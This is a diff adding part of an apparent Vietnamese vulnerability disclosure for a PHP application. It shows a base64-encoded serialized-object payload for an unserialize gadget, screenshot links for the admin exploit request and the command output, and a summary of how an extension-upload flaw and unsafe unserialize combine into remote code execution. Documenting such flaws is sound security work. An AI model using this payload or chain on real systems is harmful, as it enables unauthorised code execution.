@@ -55,3 +55,31 @@ $payload = [
 **Chuỗi base64 gửi trong tham số `data`:**
 ```
 YTo0OntzOjI6ImlkIjtpOjE7czozOiJ0aWQiO2k6MTtzOjEwOiJjb21wYXRpYmxlIjthOjE6e3M6MjoiaWQiO2k6MTt9aTowO086MTI6IlRydWVCVlxGcnVpdCI6MDp7fX0=
+```
+
+**Request exploit (Admin access):**  
+<img src="https://github.com/user-attachments/assets/88ab44e7-847b-4baa-af24-414fef185cf2" width="500"/>
+
+---
+
+## Bước 3 – Xác nhận RCE
+
+- Gadget ghi kết quả thực thi lệnh `id` vào file:  
+  `data/tmp/rce_test.txt`
+
+Sau khi gửi payload, kiểm tra file kết quả:
+
+<img src="https://github.com/user-attachments/assets/9e5678a0-cc7e-490f-ac64-3d5de29dae41" width="600"/>
+
+---
+
+## Kết luận
+
+Hai lỗ hổng:
+
+1. Upload extension cho phép ghi file vào thư mục `vendor/`
+2. Unserialize object từ dữ liệu người dùng trong `extensions/download`
+
+Kết hợp lại dẫn tới (RCE) 
+
+
